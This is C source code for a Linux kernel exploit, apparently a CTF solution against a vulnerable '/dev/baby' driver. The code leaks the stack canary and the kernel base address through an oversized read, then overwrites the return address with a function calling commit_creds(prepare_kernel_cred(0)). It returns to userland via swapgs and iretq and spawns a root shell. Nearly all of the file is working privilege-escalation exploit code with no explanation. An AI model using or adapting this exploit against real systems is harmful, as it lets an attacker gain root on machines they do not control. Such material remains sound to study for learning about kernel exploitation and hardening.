#define _GNU_SOURCE
#include "libpwn.c"

// ffffffffc00000e7 t baby_write   [baby]
// break *0xffffffffc0000187

// root@intigriti:/home/ctf# cat /proc/kallsyms | grep "prepare_kernel_cred"
// ffffffff810861d0 T prepare_kernel_cred
// root@intigriti:/home/ctf# cat /proc/kallsyms | grep "commit_cred"
// ffffffff81085fa0 T commit_creds

#define prepare_kernel_cred (kbase + 0x861d0)
#define commit_creds (kbase + 0x85fa0)

void restore_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "swapgs;" 
        "mov r15, _proc_ss;"
        "push r15;"
        "mov r15, _proc_rsp;"
        "push r15;"
        "mov r15, _proc_rflags;"
        "push r15;"
        "mov r15, _proc_cs;"
        "push r15;"
        "lea r15, spawn_shell;" 
        "push r15;"
        "iretq;"
        ".att_syntax"
        );
}

void escalate_privilege() {
    char * (*pkc)(int) = (void *)prepare_kernel_cred;
    void (*cc)(char *) = (void *)commit_creds;
    (*cc)((*pkc)(0));

    restore_state();
}

char buffer[0x400];
int fd;

int main(int argc, char *argv[]){
    signal(SIGSEGV, spawn_shell);
    save_state();

    fd = open("/dev/baby", O_RDWR);
    if(fd < 0) panic("open");

    read(fd, &buffer, 500);
    dump_hex(buffer, 500);

    u64 canary = ((u64 *)&buffer)[50]; 
    kbase = ((u64 *)&buffer)[51] - 0x1ca727;
    u64 stack = ((u64 *)&buffer)[52];
    info2("kbase", kbase);
    info2("canary", canary);

    memset(buffer, 0x0, 500);
    ((u64 *)&buffer)[50] = canary;
    ((u64 *)&buffer)[51] = (u64) &escalate_privilege;
    ((u64 *)&buffer)[52] = stack;
    write(fd, &buffer, 500);

    _pause_("end of exploit ...");
    return 0;
}